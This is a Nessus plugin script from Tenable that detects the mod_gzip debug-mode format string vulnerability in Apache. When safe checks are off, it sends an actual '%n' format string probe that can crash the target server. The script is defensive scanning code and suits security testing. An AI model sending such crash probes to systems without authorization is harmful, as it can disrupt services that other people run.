#
# (C) Tenable Network Security
#
#
# Ref:
#  From: "Matthew Murphy" <mattmurphy@kc.rr.com>
#  To: "BugTraq" <bugtraq@securityfocus.com>, 
#  Subject: Mod_gzip Debug Mode Vulnerabilities
#  Date: Sun, 1 Jun 2003 15:10:13 -0500


if(description)
{
 script_id(11686);
 
 script_version("$Revision: 1.3 $");
 name["english"] = "mod_gzip format string attack";
 script_name(english:name["english"]);

 desc["english"] = "
The remote host is running mod_gzip with debug symbols
compiled in.

The debug code includes vulnerabilities that can be exploited
by an attacker to gain a shell on this host.

Solution : If you do not use this module, disable it completely, or
recompile it without the debug symbols.
Risk Factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "mod_gzip detection";

 script_summary(english:summary["english"]);

 script_category(ACT_MIXED_ATTACK);


 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "httpver.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");



 
port = get_kb_item("Services/www");
if(!port)port = 80;

if(!get_port_state(port))exit(0);



req = http_get(item:"/index.html", port:port);
tmp = egrep(pattern:"^User-Agent", string:req);
if(tmp) req -= tmp;
idx = stridx(req, string("\r\n\r\n"));
req = insstr(req, '\r\nAccept-Encoding: gzip, deflate\r\n\r', idx , idx);
res = http_keepalive_send_recv(port:port, data:req);


if("Content-Encoding: gzip" >< res)
{
 if(safe_checks())
 {
  # Avoid FP...
  if("Apache" >!< res || "mod_gzip" >!< res)exit(0);
  
  report = "
The remote host is running mod_gzip and MAY have the debug
symbols enabled (Nessus could not verify that)


The debug code includes vulnerabilities that can be exploited
by an attacker to gain a shell on this host.


*** Since safe checks are enabled, this might be a false
*** positive.

Solution : If you do not use this module, disable it completely, or
recompile it without the debug symbols.

Risk Factor : High";
 
 security_hole(port:port, data:report);
 exit(0);
 }
 
 
req = http_get(item:"/nessus.html?nn", port:port);
req -= egrep(pattern:"^User-Agent", string:req);
idx = stridx(req, string("\r\n\r\n"));
req = insstr(req, '\r\nAccept-Encoding: gzip, deflate\r\n\r', idx , idx);
display(req);
soc = open_sock_tcp(port);
if(!soc)exit(0);
send(socket:soc, data:req);
res = http_recv(socket:soc);
close(soc);

if(strlen(res))
 {
 req = http_get(item:"/nessus.html?%n", port:port);
 req -= egrep(pattern:"^User-Agent", string:req);
 idx = stridx(req, string("\r\n\r\n"));
 req = insstr(req, '\r\nAccept-Encoding: gzip, deflate\r\n\r', idx , idx);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 res = http_recv(socket:soc);
 if(!res)security_hole(port);
 }
}
